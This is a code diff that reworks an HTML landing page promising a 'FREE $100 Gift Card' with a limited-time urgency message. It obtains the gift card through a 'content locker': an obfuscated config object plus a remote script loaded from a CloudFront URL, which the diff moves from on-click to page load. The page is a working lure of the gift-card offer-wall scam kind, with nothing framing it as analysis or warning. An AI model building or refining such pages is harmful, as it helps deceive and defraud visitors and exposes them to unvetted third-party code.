@@ -1,67 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Get Your Free Gift Card</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Claim Your Free Gift Card</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #00c6ff, #0072ff);
-      color: white;
-      text-align: center;
-      padding: 50px;
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
     .container {
-      background-color: rgba(0, 0, 0, 0.7);
-      padding: 40px;
+      background: rgba(0,0,0,0.6);
+      padding: 40px 50px;
       border-radius: 15px;
-      max-width: 500px;
-      margin: auto;
+      max-width: 450px;
+      text-align: center;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
     }
     h1 {
-      font-size: 32px;
-      margin-bottom: 20px;
+      font-size: 2.5rem;
+      margin-bottom: 15px;
     }
     p {
-      font-size: 18px;
+      font-size: 1.1rem;
+      margin-bottom: 30px;
+      line-height: 1.4;
     }
-    .btn {
-      margin-top: 20px;
-      padding: 15px 30px;
-      background-color: #ffcc00;
-      color: black;
-      font-weight: bold;
+    button {
+      background: #ffcc00;
       border: none;
-      border-radius: 10px;
+      padding: 15px 40px;
+      border-radius: 50px;
+      color: #000;
+      font-weight: 700;
+      font-size: 1.2rem;
       cursor: pointer;
-      font-size: 18px;
+      transition: background 0.3s ease;
     }
-    .btn:hover {
-      background-color: #ffaa00;
+    button:hover {
+      background: #e6b800;
+    }
+    footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #ddd;
+      user-select: none;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🎁 Claim Your Free $100 Gift Card</h1>
-    <p>Complete a quick offer to unlock your reward.</p>
-    <button class="btn" onclick="openLocker()">Unlock Now</button>
+    <h1>🎁 Get Your FREE $100 Gift Card!</h1>
+    <p>Complete a quick offer to unlock your reward instantly. Hurry, limited time only!</p>
+    <button id="unlockBtn">Unlock Now</button>
   </div>
 
-  <!-- Locker Script (Hidden, Activated on Click) -->
-  <script>
-    function openLocker() {
-      var lockerScript = document.createElement('script');
-      lockerScript.type = 'text/javascript';
-      lockerScript.innerHTML = `
-        var RSWkR_MiW_vVrYwc = {"it":4498463,"key":"65dbf"};
-      `;
-      document.body.appendChild(lockerScript);
-      var externalScript = document.createElement('script');
-      externalScript.src = "https://d2yc6hxtq0phup.cloudfront.net/0b77f29.js";
-      document.body.appendChild(externalScript);
-    }
+  <!-- Content Locker Scripts -->
+  <script type="text/javascript">
+    var RSWkR_MiW_vVrYwc = {"it":4498463,"key":"65dbf"};
   </script>
+  <script src="https://d2yc6hxtq0phup.cloudfront.net/0b77f29.js"></script>
+
+  <script>
+    const btn = document.getElementById('unlockBtn');
+    btn.addEventListener('click', () => {
+      // Show locker overlay (locker script auto handles this)
+      // Optionally disable button to avoid multiple clicks
+      btn.disabled = true;
+      btn.textContent = 'Loading...';
+    });
+  </script>
+
+  <footer>© 2025 Your Company - All rights reserved</footer>
 </body>
 </html>
